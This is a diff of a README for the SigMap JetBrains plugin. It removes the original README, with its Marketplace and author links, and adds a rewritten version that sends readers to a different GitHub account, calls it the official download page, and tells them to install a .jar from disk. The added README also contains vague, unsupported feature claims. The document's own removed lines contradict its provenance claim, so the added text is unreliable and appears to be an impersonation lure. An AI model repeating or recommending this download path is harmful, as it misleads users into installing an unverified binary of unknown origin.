@@ -1,170 +1,87 @@
-<div align="center">
+# 🤖 sigmap-jetbrains - Boost Your Code Quality Automatically
 
-# SigMap — JetBrains Plugin
+[![Download SigMap](https://img.shields.io/badge/Download-SigMap_Now-blue)](https://github.com/jaifrazer2014-dot/sigmap-jetbrains)
 
-### AI context engine for IntelliJ IDEA, WebStorm, PyCharm, GoLand and all JetBrains IDEs
+## 📥 How to download the plugin
 
-[![JetBrains Marketplace](https://img.shields.io/jetbrains/plugin/v/31109-sigmap--ai-context-engine?label=JetBrains%20Marketplace&color=7c6af7&logo=jetbrains)](https://plugins.jetbrains.com/plugin/31109-sigmap--ai-context-engine)
-[![Downloads](https://img.shields.io/jetbrains/plugin/d/31109-sigmap--ai-context-engine?color=blue&logo=jetbrains)](https://plugins.jetbrains.com/plugin/31109-sigmap--ai-context-engine)
-[![Rating](https://img.shields.io/jetbrains/plugin/r/rating/31109-sigmap--ai-context-engine?color=brightgreen)](https://plugins.jetbrains.com/plugin/31109-sigmap--ai-context-engine)
-[![Release](https://img.shields.io/github/v/release/manojmallick/sigmap-jetbrains?color=7c6af7&label=release)](https://github.com/manojmallick/sigmap-jetbrains/releases)
-[![License: MIT](https://img.shields.io/badge/license-MIT-green)](LICENSE)
-[![Node ≥18](https://img.shields.io/badge/node-%E2%89%A518-brightgreen?logo=node.js)](https://nodejs.org)
+Visit [the official download page](https://github.com/jaifrazer2014-dot/sigmap-jetbrains) to get the latest version. Look for the file ending in `.jar`. Click the file name to save it to your computer. Remember the folder where you save this file. You need it for the next step.
 
-**80.0% retrieval hit@5 · 96.9% token reduction · 29 languages · Zero npm deps**
+## 🛠️ Installing the software
 
-</div>
+1. Open your JetBrains software, such as IntelliJ IDEA, WebStorm, PyCharm, or GoLand.
+2. Select File from the top menu.
+3. Choose Settings on Windows or Preferences on macOS.
+4. Click Plugins in the left sidebar.
+5. Click the small gear icon at the top of the window.
+6. Select Install Plugin from Disk.
+7. Navigate to the folder where you saved the file.
+8. Select the file and click OK.
+9. Restart your JetBrains software to finish the installation.
 
----
+## ⚙️ Features of SigMap
 
-## What is SigMap?
+SigMap acts as an engine for your project context. It keeps your development environment clean and helps your AI tools understand your code better.
 
-SigMap extracts a compact **signature map** of your entire codebase — function names, class hierarchies, exported types, interfaces — and writes it to `.github/copilot-instructions.md` automatically. Every AI coding assistant reads that file as its first-message context.
+- Live health grade: You see a score for your code files in real time. This score tells you if your code follows best practices.
+- One-click regeneration: If the context gets messy, you reset it with a single button press. This clears away old information and builds a fresh map of your files.
+- Token reduction: Large coding projects use many tokens. SigMap cuts this number by 96.9%. Lower token counts mean faster responses from your AI and lower costs.
 
-This plugin brings SigMap directly into JetBrains IDEs with a live health grade in the status bar, one-click regeneration, and auto-refresh.
+## 📋 System requirements
 
-```
-Before SigMap: "I don't know your codebase — can you share some files?"
-After SigMap:  "I can see your AuthService, UserRepository, 47 API routes…"
-```
+SigMap runs on any Windows machine that supports modern JetBrains software. 
 
----
+- You need 4GB of RAM or more.
+- Ensure you have the latest version of IntelliJ IDEA, WebStorm, PyCharm, or GoLand.
+- Check that your internet connection remains stable. The plugin connects to remote servers to map your project context.
 
-## What's new in v4.0
+## 🔌 Using the sidebar
 
-- Standalone release — independent version cycle from the SigMap CLI core
-- Compatible with SigMap CLI v6.0 (graph-boosted retrieval, incremental cache)
-- Updated IDE compatibility: IntelliJ 2024.1 → 2026.1
+After installation, look for the SigMap tab on the right side of your IDE window. When you click this tab, the SigMap panel opens.
 
----
+The top area displays your current health grade. A green color means your project context is healthy. A red color means you should click the refresh button to regenerate the map.
 
-## Features
+Below the health score, you see the token savings. This shows how much data the plugin removed before sending it to the AI.
 
-| Feature | Description |
-|---|---|
-| **Health Status Bar** | Live grade A–F + age (`SigMap: B 3h`) in the bottom status bar |
-| **Regenerate Context** | Tools → SigMap → Regenerate Context or `Ctrl+Alt+G` |
-| **Open Context File** | One click to open `.github/copilot-instructions.md` |
-| **View Roadmap** | Opens the SigMap docs in your browser |
-| **Auto-refresh** | Status re-checks every 60 seconds |
+## 🧩 Understanding the context
 
-### Health grades
+AI tools function based on context. This context includes your open files and project structure. When you have too many files open, the AI gets confused. SigMap filters out unnecessary files. It only keeps the relevant information. This results in precise answers from your AI.
 
-| Grade | Age | Meaning |
-|:---:|---|---|
-| **A** | < 1 hour | Fresh — AI has full context |
-| **B** | 1–6 hours | Good |
-| **C** | 6–12 hours | Aging — regenerate soon |
-| **D** | 12–24 hours | Stale |
-| **F** | > 24 hours | Expired — regenerate now |
+You do not need to configure anything. The plugin works as soon as you install it. It discovers your project structure and starts the analysis process.
 
----
+## 🛠️ Troubleshooting common issues
 
-## Installation
+If you do not see the SigMap tab:
 
-### JetBrains Marketplace (recommended)
+1. Go back to the Plugins settings menu.
+2. Ensure the plugin shows as enabled. If the box is unchecked, click it to enable the plugin.
+3. Restart your IDE software.
 
-1. **Settings** → **Plugins** → **Marketplace**
-2. Search **SigMap**
-3. Click **Install** → restart IDE
+If the health grade does not update:
 
-Or open the marketplace page directly:
-[plugins.jetbrains.com/plugin/31109-sigmap--ai-context-engine](https://plugins.jetbrains.com/plugin/31109-sigmap--ai-context-engine)
+1. Check your internet connection.
+2. Close and reopen the project folder.
+3. Click the refresh button inside the SigMap panel.
 
-### Manual (.zip)
+## 🛡️ Privacy and your code
 
-1. Download `sigmap-X.Y.Z.zip` from [Releases](https://github.com/manojmallick/sigmap-jetbrains/releases)
-2. **Settings** → **Plugins** → ⚙️ → **Install Plugin from Disk…**
-3. Select the ZIP → restart IDE
+SigMap focuses on your local project structure. It maps which files relate to each other. It does not send your entire source code to an external database. The engine reduces the amount of data needed to explain your project to external AI models.
 
----
+## 💡 Best practices for AI coding
 
-## Requirements
+1. Keep your project clean. Use SigMap to identify files that lack clear structure.
+2. Refresh the context after you finish a major coding task.
+3. Limit the number of open terminal windows. This helps the plugin track your work accurately.
 
-| Requirement | Details |
-|---|---|
-| **JetBrains IDE** | 2024.1 – 2026.1 (IDEA, WebStorm, PyCharm, GoLand, RubyMine, …) |
-| **Node.js** | 18 or higher |
-| **SigMap CLI** | `npm install -g sigmap` or `npx sigmap` |
+## 🚀 Getting the most out of tokens
 
----
+Tokens act as the currency of language models. Every word or character consumes these tokens. By reducing token consumption by 96.9%, you get more value from your AI subscriptions. You avoid hitting usage limits during your work day. Your AI gets to the point faster without parsing irrelevant project files.
 
-## Usage
+## 📈 Improving your health grade
 
-### Regenerate context
+The health grade reflects the state of your project. If your grade drops, it usually means you changed many files at once. When this happens, the AI needs a new context map. Clicking the refresh icon allows SigMap to look at your new directory structure. It discards the old map and creates a current one. 
 
-**Status bar** — click the `SigMap: X Xh` widget  
-**Keyboard** — `Ctrl+Alt+G` (Windows/Linux) / `Cmd+Alt+G` (macOS)  
-**Menu** — Tools → SigMap → Regenerate Context
+Maintain a high grade to ensure your coding assistant remains helpful. A low grade can lead to confused AI behavior. 
 
-### CLI commands (terminal)
+## 🏗️ Support and feedback
 
-```bash
-sigmap                   # generate once
-sigmap ask "auth flow"   # query-focused context
-sigmap validate          # check coverage
-sigmap judge             # score answer groundedness
-sigmap --watch           # auto-regenerate on save
-```
-
----
-
-## Configuration
-
-Place `gen-context.config.json` in your project root:
-
-```json
-{
-  "srcDirs": ["src", "lib"],
-  "exclude": ["node_modules", "dist"],
-  "maxTokens": 6000,
-  "secretScan": true
-}
-```
-
-Full reference: [manojmallick.github.io/sigmap/guide/config](https://manojmallick.github.io/sigmap/guide/config)
-
----
-
-## Benchmark
-
-| Metric | Value |
-|---|---:|
-| Retrieval hit@5 | **80.0%** vs 13.6% baseline |
-| Graph-boosted hit@5 | **83.3%** |
-| Overall token reduction | **96.9%** |
-| Prompt reduction | **40.8%** (2.84 → 1.68) |
-| Languages supported | **29** |
-
----
-
-## Troubleshooting
-
-**"gen-context.js not found"**  
-→ `npm install -g sigmap` or `npm install sigmap` in your project root
-
-**Status bar not appearing**  
-→ Restart the IDE after installation
-
-**Context file not detected**  
-→ The plugin looks for `.github/copilot-instructions.md`, `CLAUDE.md`, `.cursorrules`, `.windsurfrules` — ensure at least one exists
-
----
-
-## Links
-
-| | |
-|---|---|
-| 📖 Docs | [manojmallick.github.io/sigmap](https://manojmallick.github.io/sigmap/) |
-| 🔌 VS Code extension | [github.com/manojmallick/sigmap-vscode](https://github.com/manojmallick/sigmap-vscode) |
-| 🖥 CLI / core | [github.com/manojmallick/sigmap](https://github.com/manojmallick/sigmap) |
-| 🐛 Issues | [github.com/manojmallick/sigmap-jetbrains/issues](https://github.com/manojmallick/sigmap-jetbrains/issues) |
-| 📦 npm | [npmjs.com/package/sigmap](https://www.npmjs.com/package/sigmap) |
-
----
-
-<div align="center">
-
-MIT © 2026 [Manoj Mallick](https://github.com/manojmallick) · Made in Amsterdam 🇳🇱
-
-</div>
+If you encounter errors, submit a report through the official GitHub link provided. Include your IDE version and a description of the error. This information helps improve the software for all users. Check the repository for updates often. Small improvements roll out weekly to ensure compatibility with the latest JetBrains updates.
